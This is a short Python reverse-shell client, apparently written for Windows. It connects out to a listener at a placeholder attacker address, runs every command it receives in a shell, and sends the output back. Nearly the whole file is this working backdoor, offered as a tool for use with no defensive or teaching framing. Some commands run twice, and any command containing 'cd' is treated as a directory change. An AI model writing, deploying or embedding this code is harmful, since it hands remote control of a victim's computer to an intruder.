# _Modules:
from socket import *
import os
import subprocess

# _Connecting to the listener
client = socket(AF_INET, SOCK_STREAM)
client.connect(("YOUR_IP",LISTEN_PORT))

# _infinite loop for sending & receiving data
while True:
    
    # _Getting the current directory as the input on the attacker side
    location = os.popen('cd').read()
    result2 = " ".join(location) + ">>> "
    client.sendall(result2.encode())
    
    # _receiving the input
    data = client.recv(2048).decode()
    subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    # _Sending the command output
    if 'PowerShell' in data:
        client.sendall(data.encode())

    elif data == 'cd' or data == 'cd ':
        pwd = os.popen('cd').read()
        pwd = "[+] You are at: "+"".join(pwd)
        client.sendall(pwd.encode())

    elif 'cd' in data:
        dic = data[3:]
        os.chdir(dic)
        last = f"[+] Changed directory to {dic}"
        client.sendall(last.encode())

    elif 'dir' == data:
        directory = next(os.walk('.'))[2] + next(os.walk('.'))[1]
        pwd = os.popen('cd')
        loc = "".join(pwd)
        result = "The directory is: " + loc + '\n' + "\n".join(directory)
        client.sendall(result.encode())

    else:
        try:
            # _If the command doesn't exist, it will send "Bad Command. If the command exists it will send the output of the command.
            subprocess.Popen(data, shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            result = os.popen(data).read()
            client.sendall(result.encode())
        except:
            client.sendall("[-] Bad command".encode())
            continue

